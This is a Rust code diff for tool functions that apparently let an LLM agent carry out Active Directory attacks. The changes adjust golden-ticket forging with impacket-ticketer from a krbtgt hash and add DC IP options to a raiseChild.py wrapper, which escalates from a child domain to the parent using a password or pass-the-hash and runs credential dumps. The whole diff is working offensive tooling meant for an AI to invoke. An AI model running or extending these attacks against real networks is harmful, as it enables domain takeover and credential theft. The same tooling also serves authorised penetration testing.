@@ -81,9 +81,12 @@ pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
     let domain = required_str(args, "domain")?;
     let extra_sid = optional_str(args, "extra_sid");
     let username = optional_str(args, "username").unwrap_or("Administrator");
+    // -nthash expects a 32-char NT hash; strip any LM half if the LLM
+    // passed a `LM:NT` concatenated form.
+    let nt = credentials::nt_hash_only(krbtgt_hash);
 
     CommandBuilder::new("impacket-ticketer")
-        .flag("-nthash", krbtgt_hash)
+        .flag("-nthash", nt)
         .flag("-domain-sid", domain_sid)
         .flag("-domain", domain)
         .flag_opt("-extra-sid", extra_sid)
@@ -196,19 +199,27 @@ pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
 ///
 /// Required args: `child_domain`, `username`
 /// Auth: `password` (plaintext) OR `hash` (NTLM pass-the-hash). At least one required.
-/// Optional args: `target_domain`
+/// Optional args: `target_domain`, `dc_ip` (child DC IP, bypasses DNS),
+///                `target_ip` (parent DC IP, bypasses DNS)
 pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
     let child_domain = required_str(args, "child_domain")?;
     let username = required_str(args, "username")?;
     let password = optional_str(args, "password");
     let hash = optional_str(args, "hash");
     let target_domain = optional_str(args, "target_domain");
+    let dc_ip = optional_str(args, "dc_ip");
+    let target_ip = optional_str(args, "target_ip");
 
     if password.is_none() && hash.is_none() {
         anyhow::bail!("raise_child requires either 'password' or 'hash' for authentication");
     }
 
     let mut cmd = CommandBuilder::new("raiseChild.py");
+
+    cmd = cmd
+        .flag_opt("-target-domain", target_domain)
+        .flag_opt("-dc-ip", dc_ip)
+        .flag_opt("-target-ip", target_ip);
 
     if let Some(h) = hash {
         cmd = cmd
@@ -217,8 +228,6 @@ pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
     } else if let Some(p) = password {
         cmd = cmd.arg(format!("{child_domain}/{username}:{p}"));
     }
-
-    cmd = cmd.flag_opt("-target-domain", target_domain);
 
     // raiseChild performs multiple secretsdumps internally — needs extra time
     cmd.timeout_secs(300).execute().await
